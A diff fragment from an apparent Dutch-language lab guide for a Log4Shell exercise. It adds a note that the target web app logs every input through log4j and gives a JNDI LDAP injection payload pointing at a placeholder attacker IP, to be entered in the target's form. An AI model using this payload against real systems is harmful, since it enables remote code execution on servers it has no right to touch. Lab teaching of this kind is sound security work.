@@ -41,6 +41,8 @@ Browse via je webbrowser naar de webapplicatie van je target VM.
 
 Dit is normaal gezien http://targetVM-IP:8080
 
+De webapp is zo geconfigureerd dat iedere ingave gelogd wordt in log4j.
+
 Gebruik de volgende payload in het formulier op de target:
 ```text
 ${jndi:ldap://<attacker-ip>:1389/a}
